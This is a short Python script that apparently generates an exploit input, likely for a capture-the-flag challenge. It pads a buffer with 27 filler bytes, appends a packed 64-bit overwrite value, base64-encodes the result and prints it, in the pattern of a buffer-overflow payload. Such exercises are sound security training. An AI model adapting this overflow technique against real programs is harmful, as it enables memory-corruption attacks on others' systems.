
import sys
import struct
import base64

buf = b'GGGGGGGGGGGGGGGGGGGGGGGGGGG'
buf += struct.pack('<Q', 11703173701361464837)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
